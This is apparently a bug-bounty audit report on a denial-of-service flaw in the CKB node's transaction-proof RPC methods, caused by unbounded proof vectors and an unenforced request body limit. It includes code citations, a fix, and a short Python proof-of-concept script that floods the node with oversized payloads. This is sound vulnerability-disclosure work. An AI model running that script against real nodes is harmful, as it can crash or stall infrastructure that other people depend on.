Audit Report

## Title
Unbounded `indices`/`lemmas` Vectors in `verify_transaction_proof` Enable Unauthenticated Resource Exhaustion — (`rpc/src/module/chain.rs`)

## Summary
`verify_transaction_proof` and `verify_transaction_and_witness_proof` accept caller-controlled `proof.indices` and `proof.lemmas` vectors of arbitrary length with no size validation before constructing `MerkleProof` and invoking `CBMT::retrieve_leaves`/`root()`. The `max_request_body_size` configuration field exists in the `RpcConfig` struct but is never applied to the HTTP server, leaving no effective body-size guard at the transport layer. An unauthenticated caller can force O(N) heap allocation and O(N) Blake2b CPU work per request.

## Finding Description
In `verify_transaction_proof`, after a block lookup, the function unconditionally constructs a `MerkleProof` from raw caller-supplied vectors: [1](#0-0) 

No length check precedes this construction. The vectors are then passed to `CBMT::retrieve_leaves` and `merkle_proof.root()`, both of which iterate over all N entries: [2](#0-1) 

`MerkleProof` is a thin alias over the external `merkle_cbt` crate with no internal size cap: [3](#0-2) 

The same pattern is repeated verbatim in `verify_transaction_and_witness_proof` with **two** unchecked proof vectors: [4](#0-3) 

The `RpcConfig` struct declares `max_request_body_size: usize`: [5](#0-4) 

However, `RpcServer::new` never passes this value to the axum router — no `DefaultBodyLimit` layer or equivalent middleware is added to the HTTP server: [6](#0-5) 

The TCP server applies a 2 MB `LinesCodec` limit, but the HTTP server has no equivalent guard: [7](#0-6) 

The `max_request_body_size` config field is effectively dead code for the HTTP path, meaning the configured limit is silently ignored.

## Impact Explanation
This matches **High (10001–15000 points): Vulnerabilities which could easily crash a CKB node**. A sustained series of large-payload requests forces repeated O(N) heap allocation (each `H256`/`lemma` is 32 bytes; each `Uint32`/`index` is 4 bytes) and O(N) Blake2b hashing inside `MergeByte32::merge`. Sufficient concurrent requests can exhaust available heap and saturate CPU threads, rendering the node unresponsive to both legitimate RPC callers and p2p peers. The node process may OOM-crash or become permanently stalled.

## Likelihood Explanation
The attack requires only a valid `block_hash` (freely available from `get_tip_header` or any block explorer), a single HTTP POST, and no authentication, PoW, keys, or privileged access. The attacker's cost is one TCP connection and a large JSON body; the victim's cost scales with N. The attack is trivially repeatable and automatable. Any operator who exposes the RPC port beyond localhost (a common deployment pattern for infrastructure nodes) is directly reachable.

## Recommendation
Add an explicit length guard immediately before `MerkleProof::new` in both functions:

```rust
const MAX_PROOF_ENTRIES: usize = 1024;
if tx_proof.proof.indices.len() > MAX_PROOF_ENTRIES
    || tx_proof.proof.lemmas.len() > MAX_PROOF_ENTRIES
{
    return Err(RPCError::invalid_params("proof vectors exceed maximum allowed length"));
}
```

Apply the same guard in `verify_transaction_and_witness_proof` for both `transactions_proof` and `witnesses_proof`. Additionally, wire `config.max_request_body_size` into the axum router via `DefaultBodyLimit::max(config.max_request_body_size)` so the configured body limit is actually enforced at the transport layer.

## Proof of Concept
1. Start a CKB node with the Chain RPC module enabled.
2. Obtain any valid `block_hash` via `get_tip_header`.
3. Send the following request, scaling N upward to observe linear growth in response latency and node RSS:

```python
import json, requests, time

block_hash = "0xa5f5c85987a15de25661e5a214f2c1449cd803f071acc7999820f25246471f40"
N = 50_000
payload = {
    "id": 1, "jsonrpc": "2.0",
    "method": "verify_transaction_proof",
    "params": [{
        "block_hash": block_hash,
        "witnesses_root": "0x" + "00" * 32,
        "proof": {
            "indices": ["0x0"] * N,
            "lemmas":  ["0x" + "00" * 32] * N
        }
    }]
}
t0 = time.time()
requests.post("http://127.0.0.1:8114", json=payload)
print(f"N={N}: {time.time()-t0:.2f}s")
```

Expected: elapsed time and peak RSS grow linearly with N, confirming unbounded resource consumption before the `RPCError` is returned. Repeat with multiple concurrent connections to amplify impact.

### Citations

**File:** rpc/src/module/chain.rs (L1948-1961)
```rust
                let merkle_proof = MerkleProof::new(
                    tx_proof
                        .proof
                        .indices
                        .into_iter()
                        .map(|index| index.value())
                        .collect(),
                    tx_proof
                        .proof
                        .lemmas
                        .into_iter()
                        .map(|lemma| lemma.into())
                        .collect(),
                );
```

**File:** rpc/src/module/chain.rs (L1963-1966)
```rust
                CBMT::retrieve_leaves(block.tx_hashes(), &merkle_proof)
                    .and_then(|tx_hashes| {
                        merkle_proof
                            .root(&tx_hashes)
```

**File:** rpc/src/module/chain.rs (L2016-2043)
```rust
                let transactions_merkle_proof = MerkleProof::new(
                    tx_proof
                        .transactions_proof
                        .indices
                        .into_iter()
                        .map(|index| index.value())
                        .collect(),
                    tx_proof
                        .transactions_proof
                        .lemmas
                        .into_iter()
                        .map(|lemma| lemma.into())
                        .collect(),
                );
                let witnesses_merkle_proof = MerkleProof::new(
                    tx_proof
                        .witnesses_proof
                        .indices
                        .into_iter()
                        .map(|index| index.value())
                        .collect(),
                    tx_proof
                        .witnesses_proof
                        .lemmas
                        .into_iter()
                        .map(|lemma| lemma.into())
                        .collect(),
                );
```

**File:** util/types/src/utilities/merkle_tree.rs (L23-25)
```rust
pub type CBMT = ExCBMT<Byte32, MergeByte32>;
/// Merkle proof for `Byte32` values.
pub type MerkleProof = ExMerkleProof<Byte32, MergeByte32>;
```

**File:** util/app-config/src/configs/rpc.rs (L39-40)
```rust
    /// Max request body size in bytes.
    pub max_request_body_size: usize,
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/server.rs (L165-165)
```rust
            let codec = LinesCodec::new_with_max_length(2 * 1024 * 1024);
```
